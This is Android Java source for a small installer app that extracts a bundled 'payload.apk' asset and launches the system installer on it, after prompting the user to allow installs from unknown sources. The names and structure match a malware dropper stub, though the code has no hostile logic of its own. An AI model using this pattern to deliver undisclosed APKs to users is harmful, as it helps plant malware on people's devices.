package com.installer.drop;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class MainActivity extends Activity {

    private static final String ASSET_NAME = "payload.apk";
    private static final int REQ_UNKNOWN_SOURCES = 1001;

    private TextView status;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        status = findViewById(R.id.status);
        Button btn = findViewById(R.id.btnInstall);
        btn.setOnClickListener(v -> startInstall());
    }

    private void startInstall() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                && !getPackageManager().canRequestPackageInstalls()) {
            status.setText("Allow install from this source, then return.");
            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(i, REQ_UNKNOWN_SOURCES);
            return;
        }
        dropAndLaunch();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_UNKNOWN_SOURCES) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    && getPackageManager().canRequestPackageInstalls()) {
                dropAndLaunch();
            } else {
                status.setText("Permission denied — cannot install.");
            }
        }
    }

    private void dropAndLaunch() {
        try {
            File outDir = new File(getCacheDir(), "drop");
            if (!outDir.exists()) outDir.mkdirs();
            File outFile = new File(outDir, ASSET_NAME);

            try (InputStream in = getAssets().open(ASSET_NAME);
                 OutputStream out = new FileOutputStream(outFile)) {
                byte[] buf = new byte[64 * 1024];
                int n;
                while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            }

            Uri uri = FileProvider.getUriForFile(
                    this, getPackageName() + ".fp", outFile);

            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(uri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            status.setText("Launching system installer …");
        } catch (Exception e) {
            status.setText("Install failed: " + e.getMessage());
        }
    }
}
